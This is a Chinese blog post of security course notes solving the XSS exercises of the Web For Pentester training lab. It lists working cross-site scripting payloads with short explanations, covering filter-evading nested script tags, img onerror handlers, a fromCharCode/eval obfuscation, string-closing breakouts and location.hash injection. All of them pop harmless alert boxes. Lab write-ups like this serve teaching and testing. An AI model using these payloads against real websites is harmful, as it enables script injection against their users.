---
title: security-1 Xss练习笔记
date: 2019-04-28 21:51:46
categories: 网络安全课程笔记
---
# 说明
- Web For Pentester 平台 针对Xss-Example 1-10
- 写这篇文章我用\转义html标签，因为这篇文章用markdown写的
<!--more-->

参考网站：

- https://blog.csdn.net/shinpachi8/article/details/54425439
- https://blog.csdn.net/qq_20307987/article/details/51284169
- https://blog.csdn.net/weixin_40871137/article/details/81706515


# Web For Pentester

## XSS-Example 1
```
<\script> alert(1) <\/script>
```

## XSS-Example 2
- 进行了一些过滤，script标签被过滤掉了

```
<\sc<\script>ript> alert(1) <\/sc<\/script>ript>
```
## XSS-Example 3
```
<-sc<-script>ript> alert(1) <-/sc<-/script>ript>
```
## XSS-Example 4
- 在本例中，script被完全列入黑名单，如果请求中包含script脚本，则停止执行
- 这时候需要用img标签

```
<\img src=liu.jpg onerror=alert("xss")>
```
## XSS-Example 5
- 在本例中，alert被过滤了，只要带alert，页面会返回error
- 使用JavaScript的eval和String.fromCharCode()，在不直接使用alert这个单词的情况下得到一个警告框fromcharcode()将把一个整数(十进制值)解码为对应的字符
- 可使用的方法如下

```
<\img src=liu.jpg onerror=prompt('1')>
<\img src=liu.jpg onerror=confirm('1')>
<\script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))<\/script>
```
- fromCharCode() 可接受一个指定的 Unicode 值，然后返回一个字符串,题目中
String.fromCharCode(97,108,101,114,116,40,49,41)
相当于alert(1)
- eval()是程序语言中的函数，功能是获取返回值，不同语言大同小异，函数原型是返回值 = eval( codeString )，如果eval函数在执行时遇到错误，则抛出异常给调用者

## XSS-Example 6
- 查看源代码
发现将输入到url的脚本输出到

```
var $a= "hacker<\script>alert(1)<\/script>";
```
- 利用javascipt语法
闭合前面的";
中间加上语句alert(1);
结束注释后面的分号//

```
";alert(1);//
```
## XSS-Example 7
- 和Example相似
- 不同之处在与闭合是单引号

```
';alert(1);//
```
## XSS-Example 8
- 在表单中的<都被转义，查看源代码可看到效果
- 在url中闭合from标签，可实现xss

```
/"><\script>alert(1)<\/script>
```
## XSS-Example 9
- hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）

```
location.hash
location.hash.substring(1) //从#后第一个字符开始读取
```
因此payload：
```
example9.php#<\script>alert(1)<\/script>
```
** 注意 :**

- 博主用的ie浏览器可以实验成功
- 火狐和谷歌浏览器都会对<转码如下：

```
%3Cscript%3Ealert(1)%3C/script%3E
```
